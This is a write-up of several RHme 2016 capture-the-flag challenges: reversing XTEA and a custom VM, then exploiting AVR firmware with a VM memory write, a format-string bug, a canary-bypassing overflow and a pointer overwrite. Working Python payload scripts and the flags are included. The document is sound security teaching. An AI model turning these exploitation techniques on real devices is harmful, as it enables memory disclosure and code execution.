# rhme-2016 write-up

## The Impostor (reverse - 300 pts)
This binary ask for a 16 bytes password.<br>
First, the FLAG string is load in the function @ 0x1300.<br>
Starting the reverse from 0x1300:<br>
&nbsp;&nbsp;&nbsp;&nbsp;-> 0xed0 (nothing interesting)<br>
&nbsp;&nbsp;&nbsp;&nbsp;-> 0xeb2 (nothing interesting)<br>
&nbsp;&nbsp;&nbsp;&nbsp;-> 0xa32 (!)<br>
The jump from 0xa32 is part of a big jump table which is called from an address
incremented by 2 at the begining of the function.<br>
Reversing this function, we can see that the base address is 0x0068.<br>
Looking at this address, the code doesn't look like an AVR code (until 0x05d4).<br>
With the help of radare2 and rasm2, we tried to desassemble this block with 
differents architectures until found something interesting (arm thumb).<br>
With the help of the Hopper decompiler, we discovered a XTEA algorithm used 
in order to encrypt 16 bytes.<br>
We just need to reverse this function with the following C code:

```
#include <stdio.h>
#include <stdint.h>

void tea_decrypt (uint32_t* buff, uint32_t* keys)
{
	uint32_t delta =  0xAB64E218;
	uint32_t sum = delta * 32;

	for (int i = 0; i < 32; i++) {
		buff[1] -= (((buff[0] << 4)^(buff[0] >> 5)) + buff[0]) ^ (sum + keys[(sum >> 11) & 3]);
		sum -= delta;
		buff[0] -= (((buff[1] << 4)^(buff[1] >> 5)) + buff[1]) ^ (sum + keys[sum & 3]);
	}
}

void main()
{
	uint32_t key[]  = {0x373D3943, 0x49A1C621, 0x80C6B0, 0x3C93C7B};
	uint32_t buff[] = {0xFC791D6B, 0x924E6C8F, 0x795F34A2, 0xEDAE901, 0};

	tea_decrypt (buff, key);
	tea_decrypt (&buff[2], key);
	printf("%s\n", buff);
}
```

The code was: 4rM_c0rT3xM0_4vR

## FridgeJIT (reverse - 400 pts)
Like every reverse, a password was asked.<br>
This time we have the binary and a memory dump.<br>
The strings displayed can't be found in the firmware, they shall be in the VM.<br>
First we need to find the VM opcodes to dissasemble the binary 
starting @ 0x2b8 in memory.dmp.<br>
Some instructions names are available (for the debug mode display)
in the firmware and in the memory (this part is a copy from the firmware).<br>

At first, we searched the code corresponding to the instruction NOT
because the firmware will (probably) translate this instruction with the "com"
AVR asm (one's complement).

with r2 => "/c com" gave us the choice between 3 functions.<br>
The most likely function is the first one around the address 0x13fe because it
executes every AVR instructions four time in a row (maybe a 32bits VM ?!).

To confirm, we tried with the XOR opcode:<br>
with r2 => "/c eor" gave us more possibilities..but only one is executing the
"eor" AVR instruction four times in a row and call the function @ 0xf8e like the
NOT opcode (it smells good).

The 0xf8e function allows you to know how many bytes this opcode takes by
pointing on 0x1c4+r24 (r24 is the opcode number set just before the function).<br>
eg NOP:1, PUSH:2, MOV:4, etc ...

Now, still with r2, we searched every functions around the call @ 0xf8e
```
:> /c 0xf8e
:> pd -1 @@ hit*
0x00001008      83e0           ldi r24, 0x03
0x00001098      84e0           ldi r24, 0x04
0x00001138      85e0           ldi r24, 0x05
0x000011ba      88e0           ldi r24, 0x08
0x0000123c      89e0           ldi r24, 0x09
0x000012ba      8ae0           ldi r24, 0x0a
0x000013ae      8ce0           ldi r24, 0x0c
0x0000140e      8de0           ldi r24, 0x0d
... etc
```
It seems that we found the VM opcodes location.<br>
But before dissasembling the VM, we need to know what opcode is emulated
by every functions.
```
..think..think..nyan..think..
```
And finally we wrote the script fridgejit_parser.py.<br>
After execution, you have (almost) a clear program and we can see were 
the strings displayed at the begining comes from.<br>
The interesting part is the following:
```
[0134] MOVL r5,  #018c
[0138] CALL  r5
[013a] JNZ #0184
[013d] MOVL r5,  #01b0
[0141] CALL  r5
[0143] JNZ #0184
[0146] MOVL r5,  #01cc
[014a] CALL  r5
[014c] JNZ #0184
[014f] MOVL r5,  #020c
[0153] CALL  r5
[0155] JNZ #0184
[0158] MOVL r5,  #0234
[015c] CALL  r5
[015e] JNZ #0184
[0161] MOVL r5,  #025c
[0165] CALL  r5
[0167] JNZ #0184
[016a] MOVL r5,  #0270
[016e] CALL  r5
[0170] JNZ #0184
[0173] MOVL r5,  #0288
[0177] CALL  r5
[0179] JNZ #0184
[017c] MOVL r5,  #00f8
[0180] CALL  r5
[0182] ?! 7c
[0183] ?! c2
[0184] MOVL r5,  #0050
[0188] CALL  r5
```
If every call are returning >0, then it will display "Correct" else "Incorrect!"<br>
=> We need to reverse every functions !
```python
def rol(data, shift, size=32):
    shift %= size
    remains = data >> (size - shift)
    body = (data << shift) - (remains << size )
    return (body + remains)

def ror(data, shift, size=32):
    shift %= size
    body = data >> shift
    remains = (data << (size - shift)) - (body << size)
    return (body + remains)

def disp(s,offset=0):
    raw = [s[i:i+2] for i in range(0, len(s), 2)][::-1]
    if offset:
        pad = " " * offset
    else:
        pad = ""
    out = ""
    for byte in raw:
        out += chr(int(byte,16))
    print pad+out.split()[0]

s = []
s.append("%08x" % (ror(0x5dd53c4f^0x3d6782a5, 0x11)))
s.append("%08x" % ((0x536d3b6d-0x2325dbf8) & 0xffffffff))
s.append("%08x" % ((0x5f<<24 | 0x54<<16 | 0x30<<8 | 0x47) & 0xffffffff))
s.append("%08x" % ((0x2059e2bd|0x536d0018)^(0xbde9+rol(0x74c,0x10))))
s.append("%08x" % (rol(0x9317eee5^(rol(0x3815cfb2,0x13)),0x13)))
s.append("%08x" % ((0xd419837a+0x9317eee5) & 0xffffffff))
s.append("%08x" % ((0xd419837a+0x9317eee5)-(rol(0xb2ef2c90,12))))
s.append("%06x" % (0x66d7db8e^0xb2ef2c90^0xd419837a^12))
i = 0
for chunk in s:
    disp(chunk, i)
    i += 2
```
if you execute this script, you will find the code (flag) : Y0u_G0T_1t_r1ght!

## Hide & Seek (Other - 400 pts)
This challenge is based on FridgeJIT.<br>
At startup, the loader is available to execute a custom VM.<br>
If there is no errors in the VM, the program will finish..and no flag :p<br>
First, we tried the previous VM (FridgeJIT), everything was working, great !<br>
Then we tried something different like "ee" and got an Oops message.<br>
After, the fridgeJIT console was displayed and we got an access to different
commands like execute, debug, load...<br>
The next step was to find a vulnerability in the VM in order to dump the RAM.<br>
We tried a lot of opcode combination in order to manipulate the stack (push,
pop, call, ret).<br>
A weird behavior appeared after the execution of call r0 with SP=0, we got a 
binary dump through the console by loading "aa" 47 times.<br>
After a lot of testing, we found that executing the following command allows you
to move the Loader pointer:
```
  SP = 0     ptr = x     call
"04600000"+"00"*(x - 6)+"1200"
note: x < 0x2bc (buffer size)
```
With the debug console, every opcode and parameters are translated though a
printf("%s",..) stuff and we can write everywhere with the previous exploit..<br>
so, if the NOP string address is modified (or PUSH, POP whatever), we can dump
all the RAM through the debug console.<br>
In order to dump the RAM, we set the loader pointer to 0x1e4, this is the 
address of the NOP string pointer.<br>
After the RAM dump analysis, the FLAG string appears in 2 places 0x269 and 0x700.

!!But!!<br>
Behind the "FLAG:" string @ 0x700, there are nothing (so sad..)<br>
To sum up, we can read RAM, write anywhere..the last thing we can do is to get code execution.<br>  
Then we fuzz everything in the range 0x100-0x1e4 to get something,
and after a lot of try, we got nothing..(so sad x2).<br>
The way to have an execution with this AVR is to watch every icall.<br>
With r2: 
```
:> /c icall
0x00000466   # 2: icall (can't exploit)
0x00001d5e   # 2: icall (\o/)
0x000027d6   # 2: icall (don't care)
```
The icall takes values in RAM with r31:r30 = \*0x16c:*0x16b according to the
value @ 0x16a.<br>
Then, we fuzz the value @ 0x16a in order to get something call!<br>
Result: the value 0x1e seems to be a good choice, because we got crash :)<br>
Then we tried many (random) addresses and we found a good setting with 0x1000
as parameter (payload = "1e0010" @ 0x16a).<br>
Then we rewrite the RAM until 0x1e4 to dump the string @ 0x700 to recover the
flag \o/.

```python
from rhme_serial import *

s = rhme_serial()
s.xfer("ee\n")
s.xfer("\n")
s.xfer("l\n")
s.xfer("04600000"+"00"*(0x16a-6)+"1200\n")
s.xfer("e\n")
s.xfer("\n")
s.xfer("l\n")
s.xfer("1e0010\n")
s.xfer("e\n")
s.xfer("\n")
s.xfer("l\n")
s.xfer("00000c02fb0c03f40704280805720806540d07a10d08c4080901090a44090b810900be090dfb090e2b0a0f6a0a10a90a11020b12ee0d135107141807153607165b0b17a40b18c10019de0b1afb0b1b180c1c500c1d770c1e950c00414243c4c5464748494a4b4c4d52139455569798595a5b5c1f4e4f50511d1e00000007\n")
print s.xfer("d\n")
s.close()
```

## Weird Machine (Exploit - 400 pts)
This challenge is the continuation of hide&seek, but harder (normally).<br>
The behavior is exactly like hide&seek, you're beginning with the loader and you
can enter in debug mode by sending a wrong command.<br>
Before looking elsewhere, we tried the last exploit (h&s) and it didn't work..<br>
But it seems that the code execution still worked and the flag is still @ 0x700
in RAM..We must fuzz this !<br>
And .....nyan..... Kaboooom !!<br>
if you replace 0x1000 by 0x710, you got the flag :)

```python
from rhme_serial import *

s = rhme_serial()
s.xfer("ee\n")
s.xfer("\n")
s.xfer("l\n")
s.xfer("04600000"+"00"*(0x16a-6)+"1200\n")
s.xfer("e\n")
s.xfer("\n")
s.xfer("l\n")
s.xfer("1e1007\n")
s.xfer("e\n")
s.xfer("\n")
s.xfer("l\n")
s.xfer("00000c02fb0c03f40704280805720806540d07a10d08c4080901090a44090b810900be090dfb090e2b0a0f6a0a10a90a11020b12ee0d135107141807153607165b0b17a40b18c10019de0b1afb0b1b180c1c500c1d770c1e950c00414243c4c5464748494a4b4c4d52139455569798595a5b5c1f4e4f50511d1e00000007\n")
print s.xfer("d\n")
s.close()
```

## Casino (Exploit - 150 pts)
:> String format exploit

first you need free coupons by playing with the Spin [1]<br>
note: you have to repeat this a lot...<br>

Then, select the drink menu.<br>
You'll be asked to select a drink, this menu is only available with free coupons.<br>
This input is printed (if you entered aaa => aaa is displayed).<br>
I tried %s %s and got memory dump !!<br>

Then we tried many address and..Kabooooom ("\x17\x61 %s" as input works good)<br>
note: 0x6117 is for the fun (0x900 max)
``` python
from rhme_serial import *

s = rhme_serial()
tickets = 0
while not tickets:
    trash = s.xfer("4\n")
    trash = s.xfer("1\n")
    trash = s.xfer("S\n")
    trash = s.xfer("\r\n")
    if int(trash.split("left: ")[1][0]):
        tickets = 1
trash = s.xfer("3\n")
print s.xfer("\x17\x61 %s\n")
s.close()
```

## Photo manager (Exploit - 100 pts)
Only 2 selections for this one, the second selection allows you to know how many<br>
bytes are available, the first is waiting his overflow with the length computed
before.<br>
This overflow is protected by canary (or a kind of..) which is a byte
corresponding to the length..<br>
Then we fuzz the following byte and we got the flag with 0xff :).

``` python
from rhme_serial import *

s = rhme_serial()
trash = s.xfer()
mem = s.xfer("2\n")
if len(mem):
    n = [int(a) for a in mem.split() if a.isdigit()]
    delta = n[0] - n[1] - 8
    print "mem: " + str(delta)
else:
    delta = 0

trash = s.xfer("1\n");
print s.xfer("\x30"*delta + chr(delta) + "\xff\n")
s.close()
```

## Animals (Exloit - 200 pts)
You can select 1 of the 3 animals to display an ASCII art (cat, dog, mouse).<br>
First test, we sent dog+aaaaaaaaaa...(many times) until a memory dump.<br>
After analysing these bytes, we can understand that they correpond to a table
with different addresses (+ some parameters) used to display the picture.<br>
We can change the current selection by modifying the 2 bytes just after the 
overflow.<br>
Whatever, we can see & verify the following addresses associations:<br>
cat = 0x015e<br>
dog = 0x0158<br>
mouse = 0x0152<br>
??? =  0x014c (yeah)<br>
Replaced the last address is not enough, we need to set a kind of offset
defined by the next 2 bytes..<br>
After few tries, we got the following payload with python:
``` python
from rhme_serial import *

s = rhme_serial()
print s.xfer("dogaaaaaaaaaaaaaaaaa\x4c\x01\x6b\x03\r\n")
s.close()
```
and got the flag of course !
